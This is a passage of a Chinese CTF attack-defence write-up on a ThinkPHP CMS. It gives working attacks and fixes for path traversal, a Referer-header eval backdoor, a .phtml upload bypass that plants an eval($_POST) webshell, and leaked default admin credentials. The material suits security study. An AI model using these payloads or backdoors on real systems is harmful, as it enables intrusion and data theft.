class="hljs-string">&#x27;file not exists!&#x27;</span>)];<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json</span>(<span class="hljs-variable">$result</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// 获取文件名</span><br>    <span class="hljs-variable">$fileName</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$file</span>);<br><br>    <span class="hljs-comment">// 设置HTTP响应头</span><br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: application/octet-stream&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Disposition: attachment; filename=&#x27;</span> . <span class="hljs-variable">$fileName</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Length: &#x27;</span> . <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$file</span>));<br><br>    <span class="hljs-comment">// 读取文件并输出给用户</span><br>    <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$file</span>);<br><br>    <span class="hljs-comment">// 终止脚本继续执行</span><br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>攻击：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/frontend/Ajax/getfile?file=../../../../../../flag<br></code></pre></td></tr></table></figure><p><img src="/img/awd/ccb-cms-1.png"></p><p><strong>修复：</strong></p><p>增加过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getfile</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">root_path</span>().<span class="hljs-string">&#x27;public/storage/uploads/&#x27;</span>.<span class="hljs-variable">$file</span>;<br>        <span class="hljs-comment">// 检查文件是否存在</span><br><br>        <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;../&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$file</span>);<br>        <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$file</span>);<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file</span>)) &#123;<br>            <span class="hljs-variable">$result</span> = [<span class="hljs-string">&#x27;code&#x27;</span> =&gt; <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;msg&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">lang</span>(<span class="hljs-string">&#x27;file not exists!&#x27;</span>)];<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json</span>(<span class="hljs-variable">$result</span>);<br>        &#125;<br><br>        <span class="hljs-comment">// 获取文件名</span><br>        <span class="hljs-variable">$fileName</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$file</span>);<br><br>        <span class="hljs-comment">// 设置HTTP响应头</span><br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: application/octet-stream&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Disposition: attachment; filename=&#x27;</span> . <span class="hljs-variable">$fileName</span>);<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Length: &#x27;</span> . <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$file</span>));<br><br>        <span class="hljs-comment">// 读取文件并输出给用户</span><br>        <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$file</span>);<br><br>        <span class="hljs-comment">// 终止脚本继续执行</span><br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="漏洞2-默认后门-1"><a href="#漏洞2-默认后门-1" class="headerlink" title="漏洞2-默认后门"></a>漏洞2-默认后门</h2><p><code>\app\api\controller\v1\Token.php</code>存在任意命令执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">app</span>\<span class="hljs-title class_">api</span>\<span class="hljs-title class_">controller</span>\<span class="hljs-title class_">v1</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">fun</span>\<span class="hljs-title">auth</span>\<span class="hljs-title">Api</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">App</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">facade</span>\<span class="hljs-title">Request</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">facade</span>\<span class="hljs-title">Config</span>;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 生成token</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Token</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Api</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$noAuth</span> = [<span class="hljs-string">&#x27;*&#x27;</span>];<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">App <span class="hljs-variable">$app</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">__construct</span>(<span class="hljs-variable">$app</span>);<br>        <span class="hljs-comment">//跨域</span><br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Access-Control-Allow-Origin:*&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Access-Control-Allow-Headers:Accept,Referer,Host,Keep-Alive,User-Agent,X-Requested-With,Cache-Control,Content-Type,Cookie,token&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Access-Control-Allow-Credentials:true&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Access-Control-Allow-Methods:GET, POST, PATCH, PUT, DELETE,OPTIONS&#x27;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">build</span>(<span class="hljs-params">Request <span class="hljs-variable">$request</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$class</span> = <span class="hljs-title function_ invoke__">ucwords</span>(<span class="hljs-string">&#x27;\\fun\\auth\\&#x27;</span>.<span class="hljs-title function_ invoke__">ucfirst</span>(<span class="hljs-variable">$this</span>-&gt;type).<span class="hljs-string">&#x27;Token&#x27;</span>);<br>        <span class="hljs-variable">$token</span> = <span class="hljs-variable">$class</span>::<span class="hljs-title function_ invoke__">instance</span>();<br>        <span class="hljs-variable">$token</span>-&gt;<span class="hljs-title function_ invoke__">build</span>();<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">refresh</span>(<span class="hljs-params">Request <span class="hljs-variable">$request</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$class</span> = <span class="hljs-title function_ invoke__">ucwords</span>(<span class="hljs-string">&#x27;\\fun\\auth\\&#x27;</span>.<span class="hljs-title function_ invoke__">ucfirst</span>(<span class="hljs-variable">$this</span>-&gt;type).<span class="hljs-string">&#x27;Token&#x27;</span>);<br>        <span class="hljs-variable">$token</span> = <span class="hljs-variable">$class</span>::<span class="hljs-title function_ invoke__">instance</span>();<br>        <span class="hljs-variable">$token</span>-&gt;<span class="hljs-title function_ invoke__">refresh</span>();<br><br>    &#125;<br>       <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"></span>)</span>&#123;<br>    @<span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">getallheaders</span>()[<span class="hljs-string">&#x27;Referer&#x27;</span>]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>攻击：</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">GET <span class="hljs-regexp">/api/</span>v1.token<span class="hljs-regexp">/test HTTP/</span><span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">8.147</span>.<span class="hljs-number">134.118</span>:<span class="hljs-number">24631</span><br>Referer:system(<span class="hljs-string">&quot;cat /flag&quot;</span>);<br><br><br></code></pre></td></tr></table></figure><p><strong>修复：</strong></p><p>添加注释</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-comment">//@eval(getallheaders()[&#x27;Referer&#x27;]);</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="漏洞3-文件上传getshell"><a href="#漏洞3-文件上传getshell" class="headerlink" title="漏洞3-文件上传getshell"></a>漏洞3-文件上传getshell</h2><p><del>貌似还有个任意文件上传，比赛的时候没时间看了</del></p><p><strong>赛后复现</strong></p><p>注册后的基本设置有上传头像的地方</p><p><img src="/img/awd/ccb-cms-2.png"></p><p>定位代码</p><p>&#x2F;app&#x2F;common&#x2F;service&#x2F;UploadService.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> $file</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> bool</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> Exception</span><br><span class="hljs-comment"> * 检测文件是否符合要求</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//禁止上传PHP和HTML.ssh等脚本文件</span><br>    <span class="hljs-keyword">if</span> (<br><span class="hljs-comment">//           in_array($this-&gt;file-&gt;getMime(),</span><br><span class="hljs-comment">//               [&#x27;application/octet-stream&#x27;, &#x27;text/html&#x27;,&#x27;application/x-javascript&#x27;,&#x27;text/x-php&#x27;,&#x27;aplication/x-msdownload&#x27;,&#x27;application/java-archive&#x27;])</span><br><span class="hljs-comment">//           ||</span><br>    <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$this</span>-&gt;file-&gt;<span class="hljs-title function_ invoke__">extension</span>(),<br>        [<span class="hljs-string">&#x27;php&#x27;</span>, <span class="hljs-string">&#x27;html&#x27;</span>, <span class="hljs-string">&#x27;htm&#x27;</span>,<span class="hljs-string">&#x27;xml&#x27;</span>,<span class="hljs-string">&#x27;ssh&#x27;</span>,<span class="hljs-string">&#x27;bat&#x27;</span>,<span class="hljs-string">&#x27;jar&#x27;</span>,<span class="hljs-string">&#x27;java&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-title function_ invoke__">lang</span>(<span class="hljs-string">&#x27;File format is limited&#x27;</span>));<br>    &#125;<br>    <span class="hljs-comment">//文件大小限制</span><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-variable language_">$this</span>-&gt;file-&gt;<span class="hljs-title function_ invoke__">getSize</span>() &gt; <span class="hljs-variable language_">$this</span>-&gt;fileMaxsize*<span class="hljs-number">1024</span>)) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-title function_ invoke__">lang</span>(<span class="hljs-string">&#x27;File size is limited&#x27;</span>));<br>    &#125;<br>    <span class="hljs-comment">//文件类型限制</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;fileExt !=<span class="hljs-string">&#x27;*&#x27;</span> &amp;&amp; !<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$this</span>-&gt;file-&gt;<span class="hljs-title function_ invoke__">extension</span>(),<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;,&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;fileExt)))&#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-title function_ invoke__">lang</span>(<span class="hljs-string">&#x27;File type is limited&#x27;</span>));<br>    &#125;<br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-variable language_">$this</span>-&gt;file-&gt;<span class="hljs-title function_ invoke__">extension</span>();<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$this</span>-&gt;file-&gt;<span class="hljs-title function_ invoke__">getMime</span>(), [<span class="hljs-string">&#x27;image/gif&#x27;</span>, <span class="hljs-string">&#x27;image/jpg&#x27;</span>, <span class="hljs-string">&#x27;image/jpeg&#x27;</span>, <span class="hljs-string">&#x27;image/bmp&#x27;</span>,<span class="hljs-string">&#x27;image/png&#x27;</span>, <span class="hljs-string">&#x27;image/webp&#x27;</span>]) || <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, [<span class="hljs-string">&#x27;gif&#x27;</span>, <span class="hljs-string">&#x27;jpg&#x27;</span>, <span class="hljs-string">&#x27;jpeg&#x27;</span>, <span class="hljs-string">&#x27;bmp&#x27;</span>, <span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;webp&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$imgInfo</span> = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$this</span>-&gt;file-&gt;<span class="hljs-title function_ invoke__">getPathname</span>());<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$imgInfo</span> || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$imgInfo</span>[<span class="hljs-number">0</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$imgInfo</span>[<span class="hljs-number">1</span>])) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-title function_ invoke__">lang</span>(<span class="hljs-string">&#x27;Uploaded file is not a valid image&#x27;</span>));<br>        &#125;<br>        <span class="hljs-variable language_">$this</span>-&gt;width = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$imgInfo</span>[<span class="hljs-number">0</span>]) ? <span class="hljs-variable">$imgInfo</span>[<span class="hljs-number">0</span>] : <span class="hljs-number">0</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;height = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$imgInfo</span>[<span class="hljs-number">1</span>]) ? <span class="hljs-variable">$imgInfo</span>[<span class="hljs-number">1</span>] : <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>限制了部分后缀，用<code>phtml</code>绕过</p><p><img src="/img/awd/ccb-cms-3.png"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs awk">POST未授权上传，不需要登录<br><br>POST <span class="hljs-regexp">/frontend/</span>ajax<span class="hljs-regexp">/uploads HTTP/</span><span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">192.168</span>.<span class="hljs-number">100.129</span><br>Content-Length: <span class="hljs-number">206</span><br>Accept: application<span class="hljs-regexp">/json, text/</span>javascript, */*; q=<span class="hljs-number">0.01</span><br>X-Requested-With: XMLHttpRequest<br>User-Agent: Mozilla<span class="hljs-regexp">/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/</span><span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome<span class="hljs-regexp">/124.0.0.0 Safari/</span><span class="hljs-number">537.36</span><br>Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDbISZWkAvBPdc8u0<br>Origin: http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">100.129</span><br>Referer: http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">100.129</span><span class="hljs-regexp">/frontend/m</span>ember/set.html<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=<span class="hljs-number">0.9</span>,en;q=<span class="hljs-number">0.8</span><br>Connection: close<br><br>------WebKitFormBoundaryDbISZWkAvBPdc8u0<br>Content-Disposition: form-data; name=<span class="hljs-string">&quot;file&quot;</span>; filename=<span class="hljs-string">&quot;1.phtml&quot;</span><br>Content-Type: image/jpeg<br><br>&lt;?php<br>eval(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<br>------WebKitFormBoundaryDbISZWkAvBPdc8u0--<br><br></code></pre></td></tr></table></figure><p><strong>修复</strong></p><p>便捷的：增加对phtml的过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$this</span>-&gt;file-&gt;<span class="hljs-title function_ invoke__">extension</span>(),<br>            [<span class="hljs-string">&#x27;php&#x27;</span>, <span class="hljs-string">&#x27;html&#x27;</span>, <span class="hljs-string">&#x27;htm&#x27;</span>,<span class="hljs-string">&#x27;xml&#x27;</span>,<span class="hljs-string">&#x27;ssh&#x27;</span>,<span class="hljs-string">&#x27;bat&#x27;</span>,<span class="hljs-string">&#x27;jar&#x27;</span>,<span class="hljs-string">&#x27;java&#x27;</span>,<span class="hljs-string">&#x27;phtml&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-title function_ invoke__">lang</span>(<span class="hljs-string">&#x27;File format is limited&#x27;</span>));<br>        &#125;<br></code></pre></td></tr></table></figure><p>或者稍微麻烦一点的，增加一个白名单</p><p>&#x2F;app&#x2F;frontend&#x2F;controller&#x2F;Ajax.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> \think\response\Json</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> \think\db\exception\DataNotFoundException</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> \think\db\exception\DbException</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> \think\db\exception\ModelNotFoundException</span><br><span class="hljs-comment"> * 文件上传总入口 集成qiniu ali tenxunoss</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">uploads</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">try</span> &#123;<br><br>        <span class="hljs-variable">$list</span> = [<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>,<span class="hljs-string">&#x27;jpeg&#x27;</span>];<br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">file</span>(<span class="hljs-string">&#x27;file&#x27;</span>);<br>        <span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">getOriginalName</span>(), PATHINFO_EXTENSION));<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ext</span>,<span class="hljs-variable">$list</span>))&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;NO&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-variable">$upload</span> = <span class="hljs-title class_">UploadService</span>::<span class="hljs-title function_ invoke__">instance</span>();<br>        <span class="hljs-variable">$result</span> = <span class="hljs-variable">$upload</span>-&gt;<span class="hljs-title function_ invoke__">uploads</span>(<span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&#x27;member.id&#x27;</span>),<span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json</span>(<span class="hljs-variable">$result</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="漏洞4-后台文件上传-文件包含RCE"><a href="#漏洞4-后台文件上传-文件包含RCE" class="headerlink" title="漏洞4-后台文件上传+文件包含RCE"></a>漏洞4-后台文件上传+文件包含RCE</h2><p><strong>赛后复现</strong></p><p>F12 泄露账号密码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br>    layui.<span class="hljs-title function_">use</span>([<span class="hljs-string">&#x27;layer&#x27;</span>, <span class="hljs-string">&#x27;jquery&#x27;</span>], <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">var</span> $ = layui.<span class="hljs-property">jquery</span>,<br>            layer = layui.<span class="hljs-property">layer</span>;<br>        $(<span class="hljs-string">&#x27;.layui-tips&#x27;</span>).<span class="hljs-title function_">hover</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>            layer.<span class="hljs-title function_">tips</span>(<span class="hljs-string">&#x27;账号admin,密码123456&#x27;</span>);<br>        &#125;)<br>    &#125;)<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>访问<code>/backend</code>登录后台</p><p>发现有一个离线安装插件的功能</p><p>审计代码</p><p>&#x2F;app&#x2F;backend&#x2F;controller&#x2F;Addon.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@NodeAnnotation</span>(title=&quot;离线安装&quot;)</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> Exception</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">localinstall</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">isAjax</span>())&#123;<br>        <span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>        <span class="hljs-variable">$urls</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-title function_ invoke__">input</span>(<span class="hljs-string">&#x27;url&#x27;</span>));<br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable">$urls</span>[<span class="hljs-string">&#x27;path&#x27;</span>]??<span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span> &amp;&amp; <span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$file</span>))&#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-variable">$res</span> = <span class="hljs-title class_">ZipHelper</span>::<span class="hljs-title function_ invoke__">unzip</span>(<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$file</span>,<span class="hljs-string">&#x27;../addons&#x27;</span>);<br>            &#125;<span class="hljs-keyword">catch</span> (\<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>)&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());<br>            &#125;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>)&#123;<br>                <span class="hljs-variable">$index</span> = <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$res</span>, <span class="hljs-string">&#x27;/&#x27;</span>);<br>                <span class="hljs-variable">$addon</span> = <span class="hljs-variable">$index</span> ? <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$res</span>,<span class="hljs-number">0</span>,<span 